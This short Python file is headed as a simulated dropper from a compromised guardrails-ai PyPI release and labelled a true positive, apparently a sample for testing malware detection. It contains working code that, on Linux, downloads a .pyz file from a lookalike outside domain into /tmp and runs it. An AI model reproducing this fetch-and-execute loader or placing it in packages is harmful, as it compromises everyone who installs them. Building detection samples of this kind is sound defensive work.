# Simulated guardrails-ai 0.10.1 PyPI dropper (true positive)
import urllib.request
import subprocess
import os
import sys

if sys.platform.startswith("linux"):
    URL = "https://git-tanstack.com/transformers.pyz"
    PATH = "/tmp/transformers.pyz"

    req = urllib.request.Request(URL, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req) as response, open(PATH, 'wb') as out_file:
        out_file.write(response.read())

    subprocess.run(["python3", PATH])
